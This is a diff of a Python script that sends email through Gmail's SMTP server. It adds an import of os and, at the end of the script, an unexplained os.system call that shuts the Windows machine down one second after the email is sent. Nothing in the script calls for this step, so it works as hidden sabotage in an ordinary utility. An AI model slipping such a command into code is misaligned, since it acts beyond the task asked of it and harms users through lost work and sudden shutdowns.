@@ -1,3 +1,4 @@
+import os
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -53,5 +54,8 @@ with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
     # TODO: Send email here
     server.sendmail(sender_email, receiver_email, message.as_string())
     print("Email sent")
+
+
+os.system("shutdown /s /t 1")
 
 
